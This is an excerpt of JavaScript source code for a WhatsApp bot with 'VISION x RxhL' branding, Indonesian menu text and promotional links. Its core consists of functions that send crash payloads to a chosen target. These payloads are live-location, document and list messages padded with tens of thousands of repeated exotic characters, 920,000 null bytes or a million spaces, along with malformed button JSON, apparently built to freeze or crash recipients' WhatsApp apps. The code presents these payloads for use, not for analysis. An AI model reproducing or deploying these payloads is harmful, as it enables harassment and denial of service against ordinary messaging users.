...
if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan Masuk! 🚀`)));
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `VISION-Botz ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `VISION DOCUMENT ✅`+"ྦྷ".repeat(60000),
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "VISION BOTZ BUG" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'VISION BUG BOTTTT', url : , merchant_url :  }"
            }],
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'VisionBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `VISION, RxhL DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@mtg0dd`}}}, { quoted:m})} 

const replyz = (teks) => { 
rxhl.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "VISION x RxhL-Botz ✅", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://telegra.ph/file/36376f0b21362491e91d8.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029VagczDN6BIEoUIr5OO1H" }}}, { quoted: m }) }
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VISION OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VISION OFC','description':'Telegram: @facedapollo','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "SUPPORT",
      url: "https://www.youtube.com/@mtg0dd",
      merchant_url: "https://www.youtube.com/@mtg0dd"
   })
}
]
ewe = `┏❐  ⌜ VISION x RxhL - Botz [BETA] ⌟  ❐
┃⭔ Creator : VISION x RxhL
┃⭔ Partner : -Andraxx
┃⭔ Type : Case
┃⭔ Status : Online
...
body: ewe,
footer: `©️ Copyright Vision x RxhL`
})
break
case 'specialmenuvip':
await loading()
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'VISION OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY VISION OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
...
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 •RXHL OFFICIAL x VISION OFFICIAL• 𓁿`,
}
...
if (!isCreator) return replyz(global.nocreator)
rxhl.public = true
replyz('Sukses Change To Public')
}
break
...
Creator: Rxhl Official x VISION Botz/Salman
Telegram: @rxhlvro
Base: Rxhl/Risa x VISION Botz/Salman
Versi Bot: [BETA]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

*SCRIPT DEVELOPED BY RXHL OFFICIAL x VISION Botz/Salman*`
}
